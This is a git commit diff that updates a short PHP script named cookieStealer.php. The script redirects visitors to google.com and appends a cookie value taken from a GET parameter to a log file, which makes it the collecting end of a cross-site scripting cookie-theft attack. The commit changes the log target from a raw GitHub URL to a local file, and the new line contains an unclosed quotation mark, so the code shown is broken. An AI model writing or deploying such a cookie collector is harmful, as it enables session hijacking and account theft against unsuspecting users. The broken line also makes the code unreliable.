034f59c7db99d49d607bdbf7b3b035129ba61409
phuphan011997 <33690818+phuphan011997@users.noreply.github.com>
2018-09-13 09:58:06 +0700

    Update cookieStealer.php

--- cookieStealer.php
+++ cookieStealer.php
@@ -1,6 +1,6 @@
 <?php
 header('Location:https://google.com');
       $cookies=$_GET["c"];
-      $file = fopen("https://raw.githubusercontent.com/phuphan011997/phuphan011997.github.io/master/log.txt", 'a');
+      $file = fopen('./log.txt, 'w');
       fwrite($file, $cookies, "\n\n");
 ?>
